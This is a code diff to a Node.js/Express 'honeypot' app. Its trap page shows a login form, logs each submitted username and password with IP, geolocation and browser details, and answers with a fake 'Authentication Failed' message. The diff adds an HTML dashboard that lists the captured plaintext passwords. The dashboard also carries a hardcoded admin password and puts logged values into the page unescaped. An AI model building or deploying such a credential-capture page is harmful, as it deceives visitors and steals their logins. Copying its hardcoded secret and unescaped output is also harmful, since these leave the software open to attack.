@@ -11,7 +11,7 @@ const LOG_FILE = path.join(__dirname, 'logs.json');
 
 // Middleware setup
 app.use(useragent.express());
-app.use(express.urlencoded({ extended: true })); // Crucial for reading form data
+app.use(express.urlencoded({ extended: true }));
 
 // Helper function to read and append logs to file
 function saveLog(newLog) {
@@ -28,7 +28,7 @@ function saveLog(newLog) {
     fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
 }
 
-// Public Trap Page (Root) - Just logs the visit
+// Public Trap Page (Root)
 app.get('/', async (req, res) => {
     res.send(`
         <!DOCTYPE html>
@@ -46,11 +46,11 @@ app.get('/', async (req, res) => {
     `);
 });
 
-// Capture credentials when the form is submitted
+// Capture credentials when form is submitted
 app.post('/login', async (req, res) => {
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const ua = req.useragent;
-    const { username, password } = req.body; // Extract submitted credentials
+    const { username, password } = req.body;
 
     let geoData = {};
     try {
@@ -61,10 +61,10 @@ app.post('/login', async (req, res) => {
     }
 
     const logEntry = {
-        time: new Date().toISOString(),
+        time: new Date().toLocaleString(),
         ip,
-        username,  // Captured username
-        password,  // Captured password
+        username,
+        password,
         browser: ua.browser,
         os: ua.os,
         device: ua.platform,
@@ -73,21 +73,68 @@ app.post('/login', async (req, res) => {
 
     saveLog(logEntry);
 
-    // Show fake error so they think login failed
     res.send('<h3>Authentication Failed. Please try again.</h3>');
 });
 
-// Protected Admin Dashboard
+// Protected Admin Dashboard with HTML Table View
 app.get('/dashboard', basicAuth({
     users: { 'admin': 'SuperSecretPassword123' },
     challenge: true,
     realm: 'HoneypotAdminArea'
 }), (req, res) => {
+    let logs = [];
     if (fs.existsSync(LOG_FILE)) {
-        res.sendFile(LOG_FILE);
-    } else {
-        res.json([]);
+        try {
+            logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));
+        } catch (err) {
+            logs = [];
+        }
     }
+
+    const rows = logs.map(log => `
+        <tr>
+            <td>${log.time || ''}</td>
+            <td>${log.ip || ''}</td>
+            <td><strong>${log.username || ''}</strong></td>
+            <td><code style="background: #eee; padding: 2px 5px; border-radius: 3px;">${log.password || ''}</code></td>
+            <td>${log.browser || 'Unknown'} / ${log.os || 'Unknown'}</td>
+        </tr>
+    `).join('');
+
+    res.send(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Honeypot Dashboard</title>
+            <style>
+                body { font-family: Arial, sans-serif; margin: 30px; background: #f4f4f9; color: #333; }
+                h2 { color: #2c3e50; }
+                table { width: 100%; border-collapse: collapse; background: #fff; box-shadow: 0 2px 5px rgba(0,0,0,0.1); margin-top: 20px; border-radius: 5px; overflow: hidden; }
+                th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #ddd; }
+                th { background-color: #2c3e50; color: white; }
+                tr:hover { background-color: #f1f1f1; }
+            </style>
+        </head>
+        <body>
+            <h2>Captured Credentials & Visitor Logs</h2>
+            <p>Total Captures: <strong>${logs.length}</strong></p>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Time</th>
+                        <th>IP Address</th>
+                        <th>Username</th>
+                        <th>Password</th>
+                        <th>Browser / OS</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    ${rows.length > 0 ? rows : '<tr><td colspan="5" style="text-align:center;">No logs captured yet.</td></tr>'}
+                </tbody>
+            </table>
+        </body>
+        </html>
+    `);
 });
 
 // Start Server
